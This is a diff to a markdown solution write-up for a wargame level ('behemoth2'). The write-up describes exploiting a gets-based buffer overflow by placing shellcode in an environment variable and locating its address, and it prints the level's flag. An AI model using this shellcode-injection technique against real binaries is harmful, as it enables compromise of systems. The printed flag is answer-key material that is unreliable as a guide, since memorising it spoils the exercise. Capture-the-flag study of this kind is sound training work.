@@ -1,3 +1,8 @@
+---
+layout: default
+title: behemoth2
+---
+
 # behemoth level2 Solution
 
 first we can see the challenge is based on buffer overflow, because the binary uses get.
@@ -11,7 +16,11 @@ export SHELLCODE=$(echo -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
 ```
 we need to find the address of the env variable, using the [get_address.c](./general/get_address.c). notice to compile it with the `-m32` flag, for example: `gcc -m32 get_address.c -o get_address`
 
-after finding the address of the env variable, in our case: `0xffffd511`, we need to insert it to the script that solves the challenge [level2.py](./scripts/level2.py)
+after finding the address of the env variable, in our case: `0xffffd511`, we need to insert it to the script that solves the challenge [level2.py]
+```python
+% scripts/level2.py
+```
+
 
 
 **Flag:** ***`IxPJbQtH8q`*** 
